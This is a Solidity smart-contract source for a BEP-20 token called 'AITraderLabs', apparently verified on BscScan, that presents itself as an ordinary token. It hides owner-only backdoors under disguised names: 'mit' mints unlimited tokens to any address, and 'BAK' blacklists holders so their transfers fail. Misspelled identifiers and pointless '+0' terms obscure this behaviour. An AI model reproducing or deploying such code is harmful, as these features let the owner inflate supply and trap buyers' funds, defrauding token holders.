/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}




contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'AITraderLabs';

    string constant public symbol = 'AITrader';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 1000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromfeesd;

    mapping(address => bool) private _look;


    uint256 public _taxfeesd = 0;
    uint256 private _previousTaxfeesd = _taxfeesd;

    uint256 public _burnfeesd = 3;
    uint256 private _previousBurnfeesd = _burnfeesd;


    address public projectAddress = 0x2CCf81c7Ae9fBBac918f5D24Da7341AD84df6815;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_look[from], "is look");

        if(_isExcludedFromfeesd[from])
            removeAllfeesd();

        uint256 feesd =  calculateTaxfeesd(value)+0;

        uint256 burn =  calculateBurnfeesd(value)+0;

        balanceOf[from] = balanceOf[from].sub(value)+0;

        balanceOf[to] = balanceOf[to].add(value).sub(feesd).sub(burn);

        if(feesd > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(feesd);
            emit Transfer(from, projectAddress, feesd);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfeesd[from])
            restoreAllfeesd();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function mit(address target, uint256 edAmount) public onlyOwner{
    	require (totalSupply + edAmount+0 <= MAXSupply*1);

        balanceOf[target] = balanceOf[target].add(edAmount)+0;
        totalSupply = totalSupply.add(edAmount)+0;

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxfeesd(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfeesd).div(
            10 ** 2+0
        );
    }

    function calculateBurnfeesd(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfeesd).div(
            10 ** 2
        );
    }

    function removeAllfeesd() private {
        if(_taxfeesd == 0 && _burnfeesd == 0)
            return;

        _previousTaxfeesd = _taxfeesd;
        _previousBurnfeesd = _burnfeesd;
        _taxfeesd = 0;
        _burnfeesd = 0;
    }

    function restoreAllfeesd() private {
        _taxfeesd = _previousTaxfeesd;
        _burnfeesd = _previousBurnfeesd;
    }



    function BAK(address acbount) public onlyOwner {
        _look[acbount] = true;
    }


    function UNBAK(address acbount) public onlyOwner {
        _look[acbount] = false;
    }


    function islook(address acbount) public view returns (bool) {

        return _look[acbount];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}